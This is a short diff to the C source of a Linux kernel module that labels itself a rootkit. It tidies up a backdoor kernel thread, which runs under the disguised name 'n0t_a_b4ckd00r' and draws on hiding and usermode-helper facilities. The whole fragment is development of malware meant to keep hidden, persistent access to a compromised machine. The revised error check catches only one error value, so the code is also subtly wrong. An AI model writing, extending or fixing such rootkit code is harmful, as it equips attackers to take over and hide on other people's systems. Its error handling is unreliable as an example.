@@ -2,12 +2,11 @@
 #include <linux/delay.h> //msleep
 #include <linux/umh.h> //call_usermodehelper
 
-
 #include "config.h"
 #include "backdoor.h"
 #include "hiding.h"
 
-struct task_struct* backdoor_thread;
+static struct task_struct* backdoor_thread;
 
 static int backdoor_thread_fn(void* data){
 	while (!kthread_should_stop()){
@@ -20,7 +19,7 @@ static int backdoor_thread_fn(void* data){
 int __init backdoor_init(void){
 	log(KERN_INFO "ROOTKIT: Starting backdoor thread\n");
 	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "n0t_a_b4ckd00r"); //max name length seems to be 15
-	if (backdoor_thread < 0){
+	if (backdoor_thread == ERR_PTR(-ENOMEM)){
 		log(KERN_INFO "ROOTKIT: ERROR creating backdoor thread\n");
 		return -1;
 	}
